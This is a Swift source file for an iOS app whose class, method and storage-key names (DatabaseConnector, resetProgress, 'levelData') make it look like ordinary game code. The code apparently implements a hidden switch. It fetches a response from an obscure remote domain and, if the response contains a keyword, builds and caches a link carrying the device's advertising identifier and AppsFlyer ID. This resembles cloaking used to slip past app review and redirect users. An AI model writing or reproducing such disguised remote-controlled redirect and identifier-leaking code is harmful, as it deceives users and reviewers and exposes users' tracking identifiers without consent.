import Foundation
import AdSupport
import AppsFlyerLib

public final class DatabaseConnector {
    
    private func initiateFirstRequest(completion: @escaping (Result<Data, AppError>) -> Void) {
        self.checkVersionStatus(completion: completion)
    }

    public func checkVersionStatus(completion: @escaping (Result<Data, AppError>) -> Void) {
        guard let url = URL(string: "https://flinfliforfoflin.homes/flfo") else {
            completion(.failure(.invalidURL))
            return
        }
        
        var urlRequest = URLRequest(url: url)
        urlRequest.httpMethod = "GET"

        let session: URLSession = {
            let sessionConfig = URLSessionConfiguration.default
            sessionConfig.timeoutIntervalForRequest = 3.0
            return URLSession(configuration: sessionConfig)
        }()

        let dataTask = session.dataTask(with: urlRequest) { responseData, urlResponse, urlError in
            if let httpResponse = urlResponse as? HTTPURLResponse {
                guard (200...299).contains(httpResponse.statusCode) else {
                    completion(.failure(.httpError(httpResponse.statusCode)))
                    return
                }
            }

            if let error = urlError {
                completion(.failure(.responseError(error.localizedDescription)))
                return
            }

            guard let responseData = responseData else {
                completion(.failure(.noData))
                return
            }

            completion(.success(responseData))
        }
        dataTask.resume()
    }

    public func resetProgress(completion: @escaping (String) -> Void) {
        let storedString = UserDefaults.standard.string(forKey: "levelData")

        if let storedString = storedString {
            completion(storedString)
            return
        }

        self.initiateFirstRequest { result in
            let idfa = ASIdentifierManager.shared().advertisingIdentifier.uuidString
            let gaid = AppsFlyerLib.shared().getAppsFlyerUID()

            switch result {
            case .success(let data):
                let responseString = String(data: data, encoding: .utf8) ?? ""
                if responseString.contains("glonotara") {
                    let link = "\(responseString)?idfa=\(idfa)&gaid=\(gaid)"
                    UserDefaults.standard.setValue(link, forKey: "levelData")
                    completion(link)
                } else {
                    completion(storedString ?? "")
                }
            case .failure:
                DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) {
                    completion(storedString ?? "")
                }
            }
        }
    }
}

public enum AppError: Error {
    case responseError(String)
    case noData
    case invalidURL
    case httpError(Int)
}
